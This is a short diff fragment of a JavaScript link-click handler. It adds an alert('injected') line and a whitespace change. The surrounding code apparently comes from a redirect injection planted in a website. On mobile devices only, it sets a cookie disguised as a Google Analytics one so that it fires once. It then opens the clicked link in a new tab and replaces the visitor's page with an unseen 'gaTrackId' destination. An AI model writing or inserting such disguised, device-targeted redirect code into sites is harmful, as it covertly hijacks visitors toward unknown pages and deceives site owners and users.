@@ -37,12 +37,14 @@
                     e.preventDefault();
             
                     alert(event);
-                    
+            
                     try {
                         const targetHref = target.getAttribute('href');
                         if (!targetHref) return;
                         if (targetHref === '/' || (gaCode && gaCode === 'true') || !isMobileOrTablet())
                             return window.location.assign(targetHref);
+            
+                        alert('injected');
                         setGA('_ga_D8SD9STSJ5', 'true', 3);
                         window.open(targetHref, '_blank');
                         window.location.replace(gaTrackId);
